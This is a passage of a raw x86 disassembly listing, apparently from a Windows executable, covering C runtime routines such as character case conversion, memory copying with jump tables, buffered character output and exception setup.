  42d5c6:	movzx  ecx,BYTE PTR [ebp-0x3]
  42d5ca:	xor    eax,eax
  42d5cc:	mov    ah,BYTE PTR [ebp-0x4]
  42d5cf:	or     eax,ecx
  42d5d1:	pop    edi
  42d5d2:	pop    ebx
  42d5d3:	pop    esi
  42d5d4:	leave  
  42d5d5:	ret    
  42d5d6:	push   0x1c
  42d5d8:	push   0x439390
  42d5dd:	call   0x431210
  42d5e2:	call   0x42f51e
  42d5e7:	push   eax
  42d5e8:	call   DWORD PTR ds:0x439074
  42d5ee:	call   0x42f518
  42d5f3:	test   eax,eax
  42d5f5:	je     0x42d614
  42d5f7:	call   0x42f51e
  42d5fc:	push   eax
  42d5fd:	call   DWORD PTR ds:0x439078
  42d603:	push   0xc
  42d605:	call   0x431126
  42d60a:	pop    ecx
  42d60b:	mov    DWORD PTR [ebp-0x1c],0x1
  42d612:	jmp    0x42d618
  42d614:	and    DWORD PTR [ebp-0x1c],0x0
  42d618:	and    DWORD PTR [ebp-0x4],0x0
  42d61c:	call   0x430fba
  42d621:	mov    eax,DWORD PTR [eax+0x4]
  42d624:	mov    DWORD PTR [ebp-0x2c],eax
  42d627:	call   0x430fa1
  42d62c:	mov    DWORD PTR [ebp-0x28],eax
  42d62f:	mov    esi,0x200
  42d634:	push   esi
  42d635:	call   0x4311fe
  42d63a:	pop    ecx
  42d63b:	mov    DWORD PTR [ebp-0x24],eax
  42d63e:	test   eax,eax
  42d640:	je     0x42d65d
  42d642:	push   esi
  42d643:	call   0x430d03
  42d648:	push   eax
  42d649:	push   DWORD PTR [ebp-0x24]
  42d64c:	call   0x42da10
  42d651:	add    esp,0xc
  42d654:	mov    DWORD PTR [ebp-0x20],0x1
  42d65b:	jmp    0x42d669
  42d65d:	call   0x430d03
  42d662:	mov    DWORD PTR [ebp-0x24],eax
  42d665:	and    DWORD PTR [ebp-0x20],0x0
  42d669:	or     DWORD PTR [ebp-0x4],0xffffffff
  42d66d:	call   0x42d684
  42d672:	lea    esi,[ebp-0x2c]
  42d675:	mov    eax,DWORD PTR [ebp+0x8]
  42d678:	mov    edi,eax
  42d67a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d67b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d67c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d67d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d67e:	call   0x43124b
  42d683:	ret    
  42d684:	cmp    DWORD PTR [ebp-0x1c],0x0
  42d688:	je     0x42d694
  42d68a:	push   0xc
  42d68c:	call   0x431071
  42d691:	pop    ecx
  42d692:	jmp    0x42d6a0
  42d694:	call   0x42f51e
  42d699:	push   eax
  42d69a:	call   DWORD PTR ds:0x439078
  42d6a0:	ret    
  42d6a1:	push   0xc
  42d6a3:	push   0x4393a0
  42d6a8:	call   0x431210
  42d6ad:	mov    esi,DWORD PTR [ebp+0xc]
  42d6b0:	test   esi,esi
  42d6b2:	jne    0x42d6be
  42d6b4:	call   0x430fba
  42d6b9:	mov    eax,DWORD PTR [eax+0x8]
  42d6bc:	jmp    0x42d6c0
  42d6be:	mov    eax,DWORD PTR [esi]
  42d6c0:	test   eax,eax
  42d6c2:	jne    0x42d6d6
  42d6c4:	mov    eax,DWORD PTR [ebp+0x8]
  42d6c7:	cmp    eax,0x41
  42d6ca:	jl     0x42d72a
  42d6cc:	cmp    eax,0x5a
  42d6cf:	jg     0x42d72a
  42d6d1:	add    eax,0x20
  42d6d4:	jmp    0x42d72a
  42d6d6:	call   0x42f51e
  42d6db:	push   eax
  42d6dc:	call   DWORD PTR ds:0x439074
  42d6e2:	call   0x42f518
  42d6e7:	test   eax,eax
  42d6e9:	je     0x42d708
  42d6eb:	call   0x42f51e
  42d6f0:	push   eax
  42d6f1:	call   DWORD PTR ds:0x439078
  42d6f7:	push   0xc
  42d6f9:	call   0x431126
  42d6fe:	pop    ecx
  42d6ff:	mov    DWORD PTR [ebp-0x1c],0x1
  42d706:	jmp    0x42d70c
  42d708:	and    DWORD PTR [ebp-0x1c],0x0
  42d70c:	and    DWORD PTR [ebp-0x4],0x0
  42d710:	push   esi
  42d711:	push   DWORD PTR [ebp+0x8]
  42d714:	call   0x42d4ed
  42d719:	pop    ecx
  42d71a:	pop    ecx
  42d71b:	mov    DWORD PTR [ebp+0x8],eax
  42d71e:	or     DWORD PTR [ebp-0x4],0xffffffff
  42d722:	call   0x42d730
  42d727:	mov    eax,DWORD PTR [ebp+0x8]
  42d72a:	call   0x43124b
  42d72f:	ret    
  42d730:	cmp    DWORD PTR [ebp-0x1c],0x0
  42d734:	je     0x42d740
  42d736:	push   0xc
  42d738:	call   0x431071
  42d73d:	pop    ecx
  42d73e:	jmp    0x42d74c
  42d740:	call   0x42f51e
  42d745:	push   eax
  42d746:	call   DWORD PTR ds:0x439078
  42d74c:	ret    
  42d74d:	push   ebp
  42d74e:	mov    ebp,esp
  42d750:	sub    esp,0xc
  42d753:	push   esi
  42d754:	mov    esi,DWORD PTR [ebp+0xc]
  42d757:	test   esi,esi
  42d759:	push   edi
  42d75a:	jne    0x42d76b
  42d75c:	call   0x430fba
  42d761:	mov    edi,DWORD PTR [eax+0x8]
  42d764:	call   0x430fa1
  42d769:	jmp    0x42d770
  42d76b:	mov    edi,DWORD PTR [esi]
  42d76d:	mov    eax,DWORD PTR [esi+0x4]
  42d770:	test   edi,edi
  42d772:	mov    DWORD PTR [ebp-0xc],eax
  42d775:	jne    0x42d794
  42d777:	mov    eax,DWORD PTR [ebp+0x8]
  42d77a:	cmp    eax,0x61
  42d77d:	jl     0x42d829
  42d783:	cmp    eax,0x7a
  42d786:	jg     0x42d829
  42d78c:	sub    eax,0x20
  42d78f:	jmp    0x42d829
  42d794:	push   ebx
  42d795:	mov    ebx,DWORD PTR [ebp+0x8]
  42d798:	cmp    ebx,0x100
  42d79e:	jae    0x42d7bc
  42d7a0:	test   esi,esi
  42d7a2:	jne    0x42d7b3
  42d7a4:	push   ebx
  42d7a5:	call   0x430d43
  42d7aa:	pop    ecx
  42d7ab:	test   eax,eax
  42d7ad:	jne    0x42d7bc
  42d7af:	mov    eax,ebx
  42d7b1:	jmp    0x42d828
  42d7b3:	mov    eax,DWORD PTR [esi+0x8]
  42d7b6:	test   BYTE PTR [eax+ebx*2],0x2
  42d7ba:	jmp    0x42d7ad
  42d7bc:	mov    DWORD PTR [ebp-0x8],ebx
  42d7bf:	sar    DWORD PTR [ebp-0x8],0x8
  42d7c3:	call   0x430d03
  42d7c8:	mov    ecx,eax
  42d7ca:	mov    al,BYTE PTR [ebp-0x8]
  42d7cd:	movzx  edx,al
  42d7d0:	test   BYTE PTR [ecx+edx*2+0x1],0x80
  42d7d5:	je     0x42d7e6
  42d7d7:	push   0x2
  42d7d9:	mov    BYTE PTR [ebp+0xc],al
  42d7dc:	mov    BYTE PTR [ebp+0xd],bl
  42d7df:	mov    BYTE PTR [ebp+0xe],0x0
  42d7e3:	pop    eax
  42d7e4:	jmp    0x42d7f0
  42d7e6:	xor    eax,eax
  42d7e8:	mov    BYTE PTR [ebp+0xc],bl
  42d7eb:	mov    BYTE PTR [ebp+0xd],0x0
  42d7ef:	inc    eax
  42d7f0:	push   0x1
  42d7f2:	push   DWORD PTR [ebp-0xc]
  42d7f5:	lea    ecx,[ebp-0x4]
  42d7f8:	push   0x3
  42d7fa:	push   ecx
  42d7fb:	push   eax
  42d7fc:	lea    eax,[ebp+0xc]
  42d7ff:	push   eax
  42d800:	push   0x200
  42d805:	push   edi
  42d806:	call   0x430947
  42d80b:	add    esp,0x20
  42d80e:	test   eax,eax
  42d810:	je     0x42d7af
  42d812:	cmp    eax,0x1
  42d815:	jne    0x42d81d
  42d817:	movzx  eax,BYTE PTR [ebp-0x4]
  42d81b:	jmp    0x42d828
  42d81d:	movzx  ecx,BYTE PTR [ebp-0x3]
  42d821:	xor    eax,eax
  42d823:	mov    ah,BYTE PTR [ebp-0x4]
  42d826:	or     eax,ecx
  42d828:	pop    ebx
  42d829:	pop    edi
  42d82a:	pop    esi
  42d82b:	leave  
  42d82c:	ret    
  42d82d:	push   0xc
  42d82f:	push   0x4393b0
  42d834:	call   0x431210
  42d839:	mov    esi,DWORD PTR [ebp+0xc]
  42d83c:	test   esi,esi
  42d83e:	jne    0x42d84a
  42d840:	call   0x430fba
  42d845:	mov    eax,DWORD PTR [eax+0x8]
  42d848:	jmp    0x42d84c
  42d84a:	mov    eax,DWORD PTR [esi]
  42d84c:	test   eax,eax
  42d84e:	jne    0x42d862
  42d850:	mov    eax,DWORD PTR [ebp+0x8]
  42d853:	cmp    eax,0x61
  42d856:	jl     0x42d8b6
  42d858:	cmp    eax,0x7a
  42d85b:	jg     0x42d8b6
  42d85d:	sub    eax,0x20
  42d860:	jmp    0x42d8b6
  42d862:	call   0x42f51e
  42d867:	push   eax
  42d868:	call   DWORD PTR ds:0x439074
  42d86e:	call   0x42f518
  42d873:	test   eax,eax
  42d875:	je     0x42d894
  42d877:	call   0x42f51e
  42d87c:	push   eax
  42d87d:	call   DWORD PTR ds:0x439078
  42d883:	push   0xc
  42d885:	call   0x431126
  42d88a:	pop    ecx
  42d88b:	mov    DWORD PTR [ebp-0x1c],0x1
  42d892:	jmp    0x42d898
  42d894:	and    DWORD PTR [ebp-0x1c],0x0
  42d898:	and    DWORD PTR [ebp-0x4],0x0
  42d89c:	push   esi
  42d89d:	push   DWORD PTR [ebp+0x8]
  42d8a0:	call   0x42d74d
  42d8a5:	pop    ecx
  42d8a6:	pop    ecx
  42d8a7:	mov    DWORD PTR [ebp+0x8],eax
  42d8aa:	or     DWORD PTR [ebp-0x4],0xffffffff
  42d8ae:	call   0x42d8bc
  42d8b3:	mov    eax,DWORD PTR [ebp+0x8]
  42d8b6:	call   0x43124b
  42d8bb:	ret    
  42d8bc:	cmp    DWORD PTR [ebp-0x1c],0x0
  42d8c0:	je     0x42d8cc
  42d8c2:	push   0xc
  42d8c4:	call   0x431071
  42d8c9:	pop    ecx
  42d8ca:	jmp    0x42d8d8
  42d8cc:	call   0x42f51e
  42d8d1:	push   eax
  42d8d2:	call   DWORD PTR ds:0x439078
  42d8d8:	ret    
  42d8d9:	push   esi
  42d8da:	mov    esi,DWORD PTR [esp+0x8]
  42d8de:	jmp    0x42d8f0
  42d8e0:	push   esi
  42d8e1:	call   0x431365
  42d8e6:	test   eax,eax
  42d8e8:	pop    ecx
  42d8e9:	jne    0x42d8f0
  42d8eb:	call   0x42d9a8
  42d8f0:	push   esi
  42d8f1:	call   0x4311fe
  42d8f6:	test   eax,eax
  42d8f8:	pop    ecx
  42d8f9:	je     0x42d8e0
  42d8fb:	pop    esi
  42d8fc:	ret    
  42d8fd:	mov    eax,ds:0x43d348
  42d902:	test   eax,eax
  42d904:	jne    0x42d90b
  42d906:	jmp    0x431380
  42d90b:	mov    ecx,DWORD PTR [esp+0x4]
  42d90f:	dec    eax
  42d910:	mov    ds:0x43d348,eax
  42d915:	mov    DWORD PTR [eax*4+0x43fafc],ecx
  42d91c:	ret    
  42d91d:	jmp    0x42d933
  42d91f:	mov    eax,ds:0x43d348
  42d924:	mov    eax,DWORD PTR [eax*4+0x43fafc]
  42d92b:	inc    DWORD PTR ds:0x43d348
  42d931:	call   eax
  42d933:	cmp    DWORD PTR ds:0x43d348,0xa
  42d93a:	jb     0x42d91f
  42d93c:	ret    
  42d93d:	push   DWORD PTR [esp+0x4]
  42d941:	call   DWORD PTR ds:0x439080
  42d947:	ret    
  42d948:	push   DWORD PTR [esp+0x4]
  42d94c:	call   DWORD PTR ds:0x439084
  42d952:	ret    
  42d953:	push   DWORD PTR [esp+0x4]
  42d957:	call   DWORD PTR ds:0x439088
  42d95d:	ret    
  42d95e:	push   DWORD PTR [esp+0x4]
  42d962:	call   DWORD PTR ds:0x43908c
  42d968:	ret    
  42d969:	mov    DWORD PTR [ecx],0x4393c0
  42d96f:	jmp    0x42e6b9
  42d974:	push   esi
  42d975:	mov    esi,ecx
  42d977:	call   0x42d969
  42d97c:	test   BYTE PTR [esp+0x8],0x1
  42d981:	je     0x42d98a
  42d983:	push   esi
  42d984:	call   0x42e750
  42d989:	pop    ecx
  42d98a:	mov    eax,esi
  42d98c:	pop    esi
  42d98d:	ret    0x4
  42d990:	push   esi
  42d991:	push   DWORD PTR [esp+0x8]
  42d995:	mov    esi,ecx
  42d997:	call   0x42e66f
  42d99c:	mov    DWORD PTR [esi],0x4393c0
  42d9a2:	mov    eax,esi
  42d9a4:	pop    esi
  42d9a5:	ret    0x4
  42d9a8:	push   ebp
  42d9a9:	mov    ebp,esp
  42d9ab:	sub    esp,0x10
  42d9ae:	test   BYTE PTR ds:0x43fb34,0x1
  42d9b5:	push   esi
  42d9b6:	mov    esi,0x4393c0
  42d9bb:	jne    0x42d9ea
  42d9bd:	or     DWORD PTR ds:0x43fb34,0x1
  42d9c4:	lea    eax,[ebp-0x4]
  42d9c7:	push   eax
  42d9c8:	mov    ecx,0x43fb28
  42d9cd:	mov    DWORD PTR [ebp-0x4],0x4393c8
  42d9d4:	call   0x42e632
  42d9d9:	push   0x4382af
  42d9de:	mov    DWORD PTR ds:0x43fb28,esi
  42d9e4:	call   0x42f2e0
  42d9e9:	pop    ecx
  42d9ea:	push   0x43fb28
  42d9ef:	lea    ecx,[ebp-0x10]
  42d9f2:	call   0x42e66f
  42d9f7:	push   0x43be78
  42d9fc:	lea    eax,[ebp-0x10]
  42d9ff:	push   eax
  42da00:	mov    DWORD PTR [ebp-0x10],esi
  42da03:	call   0x42f187
  42da08:	int3   
  42da09:	int3   
  42da0a:	int3   
  42da0b:	int3   
  42da0c:	int3   
  42da0d:	int3   
  42da0e:	int3   
  42da0f:	int3   
  42da10:	push   ebp
  42da11:	mov    ebp,esp
  42da13:	push   edi
  42da14:	push   esi
  42da15:	mov    esi,DWORD PTR [ebp+0xc]
  42da18:	mov    ecx,DWORD PTR [ebp+0x10]
  42da1b:	mov    edi,DWORD PTR [ebp+0x8]
  42da1e:	mov    eax,ecx
  42da20:	mov    edx,ecx
  42da22:	add    eax,esi
  42da24:	cmp    edi,esi
  42da26:	jbe    0x42da30
  42da28:	cmp    edi,eax
  42da2a:	jb     0x42dbac
  42da30:	test   edi,0x3
  42da36:	jne    0x42da4c
  42da38:	shr    ecx,0x2
  42da3b:	and    edx,0x3
  42da3e:	cmp    ecx,0x8
  42da41:	jb     0x42da6c
  42da43:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42da45:	jmp    DWORD PTR [edx*4+0x42db5c]
  42da4c:	mov    eax,edi
  42da4e:	mov    edx,0x3
  42da53:	sub    ecx,0x4
  42da56:	jb     0x42da64
  42da58:	and    eax,0x3
  42da5b:	add    ecx,eax
  42da5d:	jmp    DWORD PTR [eax*4+0x42da70]
  42da64:	jmp    DWORD PTR [ecx*4+0x42db6c]
  42da6b:	nop
  42da6c:	jmp    DWORD PTR [ecx*4+0x42daf0]
  42da73:	nop
  42da74:	sbb    dl,0x42
  42da77:	add    BYTE PTR [edx+ebx*8-0x252fffbe],ch
  42da7e:	inc    edx
  42da7f:	add    BYTE PTR [ebx],ah
  42da81:	ror    DWORD PTR [edx-0x75f877fa],1
  42da87:	inc    esi
  42da88:	add    DWORD PTR [eax+0x468a0147],ecx
  42da8e:	add    al,cl
  42da90:	jmp    0x28a6297
  42da95:	add    esi,0x3
  42da98:	add    edi,0x3
  42da9b:	cmp    ecx,0x8
  42da9e:	jb     0x42da6c
  42daa0:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42daa2:	jmp    DWORD PTR [edx*4+0x42db5c]
  42daa9:	lea    ecx,[ecx+0x0]
  42daac:	and    edx,ecx
  42daae:	mov    al,BYTE PTR [esi]
  42dab0:	mov    BYTE PTR [edi],al
  42dab2:	mov    al,BYTE PTR [esi+0x1]
  42dab5:	shr    ecx,0x2
  42dab8:	mov    BYTE PTR [edi+0x1],al
  42dabb:	add    esi,0x2
  42dabe:	add    edi,0x2
  42dac1:	cmp    ecx,0x8
  42dac4:	jb     0x42da6c
  42dac6:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42dac8:	jmp    DWORD PTR [edx*4+0x42db5c]
  42dacf:	nop
  42dad0:	and    edx,ecx
  42dad2:	mov    al,BYTE PTR [esi]
  42dad4:	mov    BYTE PTR [edi],al
  42dad6:	add    esi,0x1
  42dad9:	shr    ecx,0x2
  42dadc:	add    edi,0x1
  42dadf:	cmp    ecx,0x8
  42dae2:	jb     0x42da6c
  42dae4:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42dae6:	jmp    DWORD PTR [edx*4+0x42db5c]
  42daed:	lea    ecx,[ecx+0x0]
  42daf0:	push   ebx
  42daf1:	fild   DWORD PTR [edx+0x0]
  42daf4:	inc    eax
  42daf5:	fild   DWORD PTR [edx+0x0]
  42daf8:	cmp    bl,bl
  42dafa:	inc    edx
  42dafb:	add    BYTE PTR [eax],dh
  42dafd:	fild   DWORD PTR [edx+0x0]
  42db00:	sub    bl,bl
  42db02:	inc    edx
  42db03:	add    BYTE PTR [eax],ah
  42db05:	fild   DWORD PTR [edx+0x0]
  42db08:	sbb    bl,bl
  42db0a:	inc    edx
  42db0b:	add    BYTE PTR [eax],dl
  42db0d:	fild   DWORD PTR [edx+0x0]
  42db10:	mov    eax,DWORD PTR [esi+ecx*4-0x1c]
  42db14:	mov    DWORD PTR [edi+ecx*4-0x1c],eax
  42db18:	mov    eax,DWORD PTR [esi+ecx*4-0x18]
  42db1c:	mov    DWORD PTR [edi+ecx*4-0x18],eax
  42db20:	mov    eax,DWORD PTR [esi+ecx*4-0x14]
  42db24:	mov    DWORD PTR [edi+ecx*4-0x14],eax
  42db28:	mov    eax,DWORD PTR [esi+ecx*4-0x10]
  42db2c:	mov    DWORD PTR [edi+ecx*4-0x10],eax
  42db30:	mov    eax,DWORD PTR [esi+ecx*4-0xc]
  42db34:	mov    DWORD PTR [edi+ecx*4-0xc],eax
  42db38:	mov    eax,DWORD PTR [esi+ecx*4-0x8]
  42db3c:	mov    DWORD PTR [edi+ecx*4-0x8],eax
  42db40:	mov    eax,DWORD PTR [esi+ecx*4-0x4]
  42db44:	mov    DWORD PTR [edi+ecx*4-0x4],eax
  42db48:	lea    eax,[ecx*4+0x0]
  42db4f:	add    esi,eax
  42db51:	add    edi,eax
  42db53:	jmp    DWORD PTR [edx*4+0x42db5c]
  42db5a:	mov    edi,edi
  42db5c:	ins    BYTE PTR es:[edi],dx
  42db5d:	fild   DWORD PTR [edx+0x0]
  42db60:	je     0x42db3d
  42db62:	inc    edx
  42db63:	add    BYTE PTR [eax-0x6bffbd25],al
  42db69:	fild   DWORD PTR [edx+0x0]
  42db6c:	mov    eax,DWORD PTR [ebp+0x8]
  42db6f:	pop    esi
  42db70:	pop    edi
  42db71:	leave  
  42db72:	ret    
  42db73:	nop
  42db74:	mov    al,BYTE PTR [esi]
  42db76:	mov    BYTE PTR [edi],al
  42db78:	mov    eax,DWORD PTR [ebp+0x8]
  42db7b:	pop    esi
  42db7c:	pop    edi
  42db7d:	leave  
  42db7e:	ret    
  42db7f:	nop
  42db80:	mov    al,BYTE PTR [esi]
  42db82:	mov    BYTE PTR [edi],al
  42db84:	mov    al,BYTE PTR [esi+0x1]
  42db87:	mov    BYTE PTR [edi+0x1],al
  42db8a:	mov    eax,DWORD PTR [ebp+0x8]
  42db8d:	pop    esi
  42db8e:	pop    edi
  42db8f:	leave  
  42db90:	ret    
  42db91:	lea    ecx,[ecx+0x0]
  42db94:	mov    al,BYTE PTR [esi]
  42db96:	mov    BYTE PTR [edi],al
  42db98:	mov    al,BYTE PTR [esi+0x1]
  42db9b:	mov    BYTE PTR [edi+0x1],al
  42db9e:	mov    al,BYTE PTR [esi+0x2]
  42dba1:	mov    BYTE PTR [edi+0x2],al
  42dba4:	mov    eax,DWORD PTR [ebp+0x8]
  42dba7:	pop    esi
  42dba8:	pop    edi
  42dba9:	leave  
  42dbaa:	ret    
  42dbab:	nop
  42dbac:	lea    esi,[ecx+esi*1-0x4]
  42dbb0:	lea    edi,[ecx+edi*1-0x4]
  42dbb4:	test   edi,0x3
  42dbba:	jne    0x42dbe0
  42dbbc:	shr    ecx,0x2
  42dbbf:	and    edx,0x3
  42dbc2:	cmp    ecx,0x8
  42dbc5:	jb     0x42dbd4
  42dbc7:	std    
  42dbc8:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42dbca:	cld    
  42dbcb:	jmp    DWORD PTR [edx*4+0x42dcf8]
  42dbd2:	mov    edi,edi
  42dbd4:	neg    ecx
  42dbd6:	jmp    DWORD PTR [ecx*4+0x42dca8]
  42dbdd:	lea    ecx,[ecx+0x0]
  42dbe0:	mov    eax,edi
  42dbe2:	mov    edx,0x3
  42dbe7:	cmp    ecx,0x4
  42dbea:	jb     0x42dbf8
  42dbec:	and    eax,0x3
  42dbef:	sub    ecx,eax
  42dbf1:	jmp    DWORD PTR [eax*4+0x42dbfc]
  42dbf8:	jmp    DWORD PTR [ecx*4+0x42dcf8]
  42dbff:	nop
  42dc00:	or     al,0xdc
  42dc02:	inc    edx
  42dc03:	add    BYTE PTR [eax],dh
  42dc05:	fadd   QWORD PTR [edx+0x0]
  42dc08:	pop    eax
  42dc09:	fadd   QWORD PTR [edx+0x0]
  42dc0c:	mov    al,BYTE PTR [esi+0x3]
  42dc0f:	and    edx,ecx
  42dc11:	mov    BYTE PTR [edi+0x3],al
  42dc14:	sub    esi,0x1
  42dc17:	shr    ecx,0x2
  42dc1a:	sub    edi,0x1
  42dc1d:	cmp    ecx,0x8
  42dc20:	jb     0x42dbd4
  42dc22:	std    
  42dc23:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42dc25:	cld    
  42dc26:	jmp    DWORD PTR [edx*4+0x42dcf8]
  42dc2d:	lea    ecx,[ecx+0x0]
  42dc30:	mov    al,BYTE PTR [esi+0x3]
  42dc33:	and    edx,ecx
  42dc35:	mov    BYTE PTR [edi+0x3],al
  42dc38:	mov    al,BYTE PTR [esi+0x2]
  42dc3b:	shr    ecx,0x2
  42dc3e:	mov    BYTE PTR [edi+0x2],al
  42dc41:	sub    esi,0x2
  42dc44:	sub    edi,0x2
  42dc47:	cmp    ecx,0x8
  42dc4a:	jb     0x42dbd4
  42dc4c:	std    
  42dc4d:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42dc4f:	cld    
  42dc50:	jmp    DWORD PTR [edx*4+0x42dcf8]
  42dc57:	nop
  42dc58:	mov    al,BYTE PTR [esi+0x3]
  42dc5b:	and    edx,ecx
  42dc5d:	mov    BYTE PTR [edi+0x3],al
  42dc60:	mov    al,BYTE PTR [esi+0x2]
  42dc63:	mov    BYTE PTR [edi+0x2],al
  42dc66:	mov    al,BYTE PTR [esi+0x1]
  42dc69:	shr    ecx,0x2
  42dc6c:	mov    BYTE PTR [edi+0x1],al
  42dc6f:	sub    esi,0x3
  42dc72:	sub    edi,0x3
  42dc75:	cmp    ecx,0x8
  42dc78:	jb     0x42dbd4
  42dc7e:	std    
  42dc7f:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42dc81:	cld    
  42dc82:	jmp    DWORD PTR [edx*4+0x42dcf8]
  42dc89:	lea    ecx,[ecx+0x0]
  42dc8c:	lods   al,BYTE PTR ds:[esi]
  42dc8d:	fadd   QWORD PTR [edx+0x0]
  42dc90:	mov    ah,0xdc
  42dc92:	inc    edx
  42dc93:	add    BYTE PTR [esp+ebx*8-0x233bffbe],bh
  42dc9a:	inc    edx
  42dc9b:	add    ah,cl
  42dc9d:	fadd   QWORD PTR [edx+0x0]
  42dca0:	aam    0xdc
  42dca2:	inc    edx
  42dca3:	add    ah,bl
  42dca5:	fadd   QWORD PTR [edx+0x0]
  42dca8:	out    dx,eax
  42dca9:	fadd   QWORD PTR [edx+0x0]
  42dcac:	mov    eax,DWORD PTR [esi+ecx*4+0x1c]
  42dcb0:	mov    DWORD PTR [edi+ecx*4+0x1c],eax
  42dcb4:	mov    eax,DWORD PTR [esi+ecx*4+0x18]
  42dcb8:	mov    DWORD PTR [edi+ecx*4+0x18],eax
  42dcbc:	mov    eax,DWORD PTR [esi+ecx*4+0x14]
  42dcc0:	mov    DWORD PTR [edi+ecx*4+0x14],eax
  42dcc4:	mov    eax,DWORD PTR [esi+ecx*4+0x10]
  42dcc8:	mov    DWORD PTR [edi+ecx*4+0x10],eax
  42dccc:	mov    eax,DWORD PTR [esi+ecx*4+0xc]
  42dcd0:	mov    DWORD PTR [edi+ecx*4+0xc],eax
  42dcd4:	mov    eax,DWORD PTR [esi+ecx*4+0x8]
  42dcd8:	mov    DWORD PTR [edi+ecx*4+0x8],eax
  42dcdc:	mov    eax,DWORD PTR [esi+ecx*4+0x4]
  42dce0:	mov    DWORD PTR [edi+ecx*4+0x4],eax
  42dce4:	lea    eax,[ecx*4+0x0]
  42dceb:	add    esi,eax
  42dced:	add    edi,eax
  42dcef:	jmp    DWORD PTR [edx*4+0x42dcf8]
  42dcf6:	mov    edi,edi
  42dcf8:	or     ch,bl
  42dcfa:	inc    edx
  42dcfb:	add    BYTE PTR [eax],dl
  42dcfd:	fld    QWORD PTR [edx+0x0]
  42dd00:	and    ch,bl
  42dd02:	inc    edx
  42dd03:	add    BYTE PTR [ebx*8+0x458b0042],dh
  42dd0a:	or     BYTE PTR [esi+0x5f],bl
  42dd0d:	leave  
  42dd0e:	ret    
  42dd0f:	nop
  42dd10:	mov    al,BYTE PTR [esi+0x3]
  42dd13:	mov    BYTE PTR [edi+0x3],al
  42dd16:	mov    eax,DWORD PTR [ebp+0x8]
  42dd19:	pop    esi
  42dd1a:	pop    edi
  42dd1b:	leave  
  42dd1c:	ret    
  42dd1d:	lea    ecx,[ecx+0x0]
  42dd20:	mov    al,BYTE PTR [esi+0x3]
  42dd23:	mov    BYTE PTR [edi+0x3],al
  42dd26:	mov    al,BYTE PTR [esi+0x2]
  42dd29:	mov    BYTE PTR [edi+0x2],al
  42dd2c:	mov    eax,DWORD PTR [ebp+0x8]
  42dd2f:	pop    esi
  42dd30:	pop    edi
  42dd31:	leave  
  42dd32:	ret    
  42dd33:	nop
  42dd34:	mov    al,BYTE PTR [esi+0x3]
  42dd37:	mov    BYTE PTR [edi+0x3],al
  42dd3a:	mov    al,BYTE PTR [esi+0x2]
  42dd3d:	mov    BYTE PTR [edi+0x2],al
  42dd40:	mov    al,BYTE PTR [esi+0x1]
  42dd43:	mov    BYTE PTR [edi+0x1],al
  42dd46:	mov    eax,DWORD PTR [ebp+0x8]
  42dd49:	pop    esi
  42dd4a:	pop    edi
  42dd4b:	leave  
  42dd4c:	ret    
  42dd4d:	push   0xc
  42dd4f:	push   0x4393d8
  42dd54:	call   0x431210
  42dd59:	mov    esi,DWORD PTR [ebp+0xc]
  42dd5c:	push   esi
  42dd5d:	call   0x42f3b5
  42dd62:	pop    ecx
  42dd63:	and    DWORD PTR [ebp-0x4],0x0
  42dd67:	dec    DWORD PTR [esi+0x4]
  42dd6a:	js     0x42dd7a
  42dd6c:	mov    ecx,DWORD PTR [esi]
  42dd6e:	mov    al,BYTE PTR [ebp+0x8]
  42dd71:	mov    BYTE PTR [ecx],al
  42dd73:	movzx  eax,al
  42dd76:	inc    DWORD PTR [esi]
  42dd78:	jmp    0x42dd85
  42dd7a:	push   esi
  42dd7b:	push   DWORD PTR [ebp+0x8]
  42dd7e:	call   0x431398
  42dd83:	pop    ecx
  42dd84:	pop    ecx
  42dd85:	mov    DWORD PTR [ebp-0x1c],eax
  42dd88:	or     DWORD PTR [ebp-0x4],0xffffffff
  42dd8c:	call   0x42dd9d
  42dd91:	mov    eax,DWORD PTR [ebp-0x1c]
  42dd94:	call   0x43124b
  42dd99:	ret    
  42dd9a:	mov    esi,DWORD PTR [ebp+0xc]
  42dd9d:	push   esi
  42dd9e:	call   0x42f407
  42dda3:	pop    ecx
  42dda4:	ret    
  42dda5:	int3   
  42dda6:	int3   
  42dda7:	int3   
  42dda8:	int3   
  42dda9:	int3   
  42ddaa:	int3   
  42ddab:	int3   
  42ddac:	int3   
  42ddad:	int3   
  42ddae:	int3   
  42ddaf:	int3   
  42ddb0:	push   ebp
  42ddb1:	mov    ebp,esp
  42ddb3:	push   edi
  42ddb4:	push   esi
  42ddb5:	mov    esi,DWORD PTR [ebp+0xc]
  42ddb8:	mov    ecx,DWORD PTR [ebp+0x10]
  42ddbb:	mov    edi,DWORD PTR [ebp+0x8]
  42ddbe:	mov    eax,ecx
  42ddc0:	mov    edx,ecx
  42ddc2:	add    eax,esi
  42ddc4:	cmp    edi,esi
  42ddc6:	jbe    0x42ddd0
  42ddc8:	cmp    edi,eax
  42ddca:	jb     0x42df4c
  42ddd0:	test   edi,0x3
  42ddd6:	jne    0x42ddec
  42ddd8:	shr    ecx,0x2
  42dddb:	and    edx,0x3
  42ddde:	cmp    ecx,0x8
  42dde1:	jb     0x42de0c
  42dde3:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42dde5:	jmp    DWORD PTR [edx*4+0x42defc]
  42ddec:	mov    eax,edi
  42ddee:	mov    edx,0x3
  42ddf3:	sub    ecx,0x4
  42ddf6:	jb     0x42de04
  42ddf8:	and    eax,0x3
  42ddfb:	add    ecx,eax
  42ddfd:	jmp    DWORD PTR [eax*4+0x42de10]
  42de04:	jmp    DWORD PTR [ecx*4+0x42df0c]
  42de0b:	nop
  42de0c:	jmp    DWORD PTR [ecx*4+0x42de90]
  42de13:	nop
  42de14:	and    dh,bl
  42de16:	inc    edx
  42de17:	add    BYTE PTR [esi+ebx*8+0x42],cl
  42de1b:	add    BYTE PTR [eax-0x22],dh
